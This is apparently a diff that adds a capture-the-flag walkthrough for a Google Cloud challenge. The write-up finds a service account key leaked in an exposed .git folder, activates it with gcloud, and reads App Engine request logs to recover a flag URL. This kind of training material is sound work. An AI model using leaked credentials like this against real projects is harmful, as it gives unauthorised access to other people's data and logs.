@@ -1,0 +1,41 @@
+There is a .git folder at /.git, looking at logs will reveal an exported service account key which has log access to the project. Using the key, you can view the AppEngine Request logs, which has a url that is repeatedly posted - it points to a (file on a GCS bucket)[https://storage.googleapis.com/shout-into-void/1574AB2CB00533975094D87814BCF8FA707FD608-flag.txt]. 
+
+Commands to use the service account key and list the available log sources.
+
+```
+gcloud auth activate-service-account --key-file=debug.json --project=<project-name>
+gcloud config set account '<account-name>'
+gcloud logging logs list
+```
+
+If this worked, you should see the available log sources, for example - 
+
+```
+NAME
+projects/example-project/logs/%2Fvar%2Flog%2Fgoogle_init.log
+projects/example-project/logs/%2Fvar%2Flog%2Fnginx%2Ferror.log
+projects/example-project/logs/appengine.googleapis.com%2Frequest_log
+projects/example-project/logs/cloudaudit.googleapis.com%2Factivity
+projects/example-project/logs/cloudaudit.googleapis.com%2Fdata_access
+projects/example-project/logs/cloudaudit.googleapis.com%2Fsystem_event
+projects/example-project/logs/cloudbuild
+projects/example-project/logs/clouderrorreporting.googleapis.com%2Finsights
+projects/example-project/logs/stderr
+projects/example-project/logs/varlog%2Fsystem
+
+```
+
+You can view what data users are submitting to the app by looking at the appengine request_log 
+
+```
+gcloud logging read request_log
+```
+
+This should show the URL being periodically posted - 
+
+```
+gcloud logging read request_log | grep storage
+  resource: /send?message=https%3A%2F%2Fstorage.googleapis.com%2Fshout-into-void%2F1574AB2CB00533975094D87814BCF8FA707FD608-flag.txt
+```
+
+This file is publicly acccessible and is the flag for the challenge. 
